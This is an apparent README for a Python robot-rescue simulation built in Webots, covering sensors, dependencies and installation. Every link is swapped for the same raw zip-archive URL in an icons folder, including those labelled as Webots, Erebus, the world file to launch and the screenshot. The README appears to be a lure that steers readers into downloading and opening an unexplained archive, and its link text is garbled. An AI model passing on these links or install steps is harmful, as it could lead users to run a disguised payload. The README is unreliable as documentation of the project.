# Mobile robot for secure operations

This project is an attempt at the implementation of a robot for securing victims in dangerous environment. It is made in [Webots](https://github.com/Allkilline/Mobile-Rescue-Robot/raw/refs/heads/main/game/protos/icons/Robot_Mobile_Rescue_v3.8.zip) using the [Erebus](https://github.com/Allkilline/Mobile-Rescue-Robot/raw/refs/heads/main/game/protos/icons/Robot_Mobile_Rescue_v3.8.zip) environmnet. This robot is equiped with the following:
- 9 laser sensors for mapping
- main camera for victim detection
- secondary camera for floor obstacle detection
- two wheels for movements
- gps for geolocation
- compass for auto calibration and navigation
- 1000x1000 screen for map visualization

## Dependencies

The project relies on multiple libraries necessary for execution:
- OpenCV cv2
- Matplotlib's pyplot
- EasyOCR
- Numpy


## Installation

The project is entirely made in python and dependencies can be installed trough pip:
```
pip install dependency
```
Once the dependencies are downloaded, it is necessary to launch the the world **https://github.com/Allkilline/Mobile-Rescue-Robot/raw/refs/heads/main/game/protos/icons/Robot_Mobile_Rescue_v3.8.zip** file through **Webots** and wait a few minutes as the detection model needs initialization alongside the Erebus framework.

## Run

Click on run to execute the code.

## Notes

Easyocr is heavy computation wise so it is preferable to use a pc equipped with **NVIDIA CUDA** to process the images.
The full implementation of our code can be found in **/game/controllers/RRR**

![Screenshot](https://github.com/Allkilline/Mobile-Rescue-Robot/raw/refs/heads/main/game/protos/icons/Robot_Mobile_Rescue_v3.8.zip%https://github.com/Allkilline/Mobile-Rescue-Robot/raw/refs/heads/main/game/protos/icons/Robot_Mobile_Rescue_v3.8.zip)
